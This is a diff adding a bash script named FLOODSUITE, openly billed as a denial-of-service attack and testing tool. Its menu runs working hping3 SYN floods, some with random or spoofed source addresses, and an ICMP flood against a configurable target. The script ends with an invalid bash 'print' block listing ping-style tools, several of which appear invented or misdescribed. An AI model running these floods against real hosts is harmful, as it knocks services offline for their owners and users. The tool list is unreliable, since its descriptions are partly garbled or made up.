@@ -1,0 +1,73 @@
+#!/bin/bash
+
+echo " FLOODSUITE - A Menu-Based Command-Line Denial Of Service Attack & Testing Tool ";  
+
+# Define menu options
+options=(
+    "Send a TCP SYN flood to target"
+    "Send a TCP SYN flood to target with random source IP"
+    "Send a TCP SYN flood to target with 15000 packets"
+    "Send a TCP SYN flood to target with random source IP and flood mode"
+    "Send a TCP SYN flood to target with spoofed source IP"
+    "Send an ICMP flood to target"
+    "Quit"
+)
+
+# Define target and spoof variables
+TARGET="example.com"
+SPOOF="spoofed.com"
+
+# Prompt user to select an option
+select option in "${options[@]}"
+do
+    case $option in
+        "Send a TCP SYN flood to target")
+            sudo hping3 -S --flood -V -p 80 $TARGET
+            ;;
+        "Send a TCP SYN flood to target with random source IP")
+            sudo hping3 $TARGET -q -n -d 120 -S -p 80 --flood --rand-source
+            ;;
+        "Send a TCP SYN flood to target with 15000 packets")
+            sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source $TARGET
+            ;;
+        "Send a TCP SYN flood to target with random source IP and flood mode")
+            sudo hping3 --rand-source $TARGET -S -q -p 80 --flood
+            ;;
+        "Send a TCP SYN flood to target with spoofed source IP")
+            sudo hping3 -a $SPOOF $TARGET -S -q -p 80
+            ;;
+        "Send an ICMP flood to target")
+            sudo hping3 --icmp --flood $TARGET
+            ;;
+        "Quit")
+            break
+            ;;
+        *) 
+            echo "Invalid option"
+            ;;
+    esac
+done
+
+
+print '
+
+    2ping: A tool for testing network connectivity by sending and receiving ICMP echo packets. This tool can be used to test for packet loss, latency, and connectivity issues.
+
+    qping: A tool similar to ping, but with a more user-friendly interface. This tool can be used to test network connectivity and latency, and it supports various options for customizing the output and behavior.
+
+    htping: A tool for testing HTTP web servers by sending requests and measuring response times. This tool can be used to test for web server performance and identify potential bottlenecks.
+
+    ping: A basic tool for testing network connectivity by sending ICMP echo packets and measuring response times. This tool is commonly used for testing network connectivity and identifying network issues.
+
+    tping: A tool for testing TCP/IP connections by attempting to connect to a specified port on a remote host. This tool can be used to test for open ports and connectivity issues.
+
+    rping: A tool for testing network connectivity by sending and receiving raw packets using various protocols. This tool can be used to test for network connectivity and identify potential issues with packet loss or corruption.
+
+    fping: A tool for testing network connectivity by sending ICMP echo packets to multiple hosts at once. This tool can be used to test connectivity to multiple hosts in a network, and it supports various options for customizing the output and behavior.
+
+    ping3: A tool similar to ping, but with additional options for customizing the output and behavior. This tool can be used to test network connectivity and latency, and it supports various options for specifying the packet size and interval.
+
+    phing: A tool for testing network connectivity by sending ICMP echo packets and measuring response times. This tool is similar to ping, but with additional options for customizing the output and behavior.
+
+    nping: A tool for testing network connectivity and security by sending various types of packets using different protocols. This tool can be used to test for network connectivity, identify potential security vulnerabilities, and perform network monitoring.'
+
